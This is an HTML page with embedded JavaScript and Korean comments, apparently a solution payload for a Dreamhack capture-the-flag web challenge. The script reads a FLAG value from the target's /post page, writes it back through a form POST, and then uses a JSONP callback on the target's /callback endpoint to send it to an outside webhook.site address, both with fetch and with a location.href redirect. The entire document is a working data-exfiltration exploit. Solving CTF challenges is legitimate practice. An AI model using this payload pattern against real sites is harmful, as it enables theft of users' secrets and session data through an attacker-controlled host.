<html>
<body>
<script>
// Step 1: /post 페이지에서 FLAG 추출
fetch('http://host8.dreamhack.games:9182/post')
  .then(r => r.text())
  .then(html => {
    // HTML 파싱하여 input value에서 FLAG 추출
    let parser = new DOMParser();
    let doc = parser.parseFromString(html, 'text/html');
    let flag = doc.querySelector('#info_value').value;
    
    // Step 2: POST 요청으로 info_value에 FLAG 저장
    let formData = new FormData();
    formData.append('info_value', flag);
    
    return fetch('http://host8.dreamhack.games:9182/post', {
      method: 'POST',
      body: formData
    });
  })
  .then(() => {
    // Step 3: JSONP callback으로 FLAG 유출
    window.exfiltrate = function(data) {
      // 외부 서버로 전송 (여기서는 Dreamhack webhook 사용)
      fetch('https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1/?flag=' + encodeURIComponent(data.info));
      
      // 또는 location.href로 직접 확인
      location.href = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1/?flag=' + encodeURIComponent(data.info);
    };
    
    // JSONP script 로드
    let script = document.createElement('script');
    script.src = 'http://host8.dreamhack.games:9182/callback?callback=window.exfiltrate';
    document.body.appendChild(script);
  });
</script>
</body>
</html>
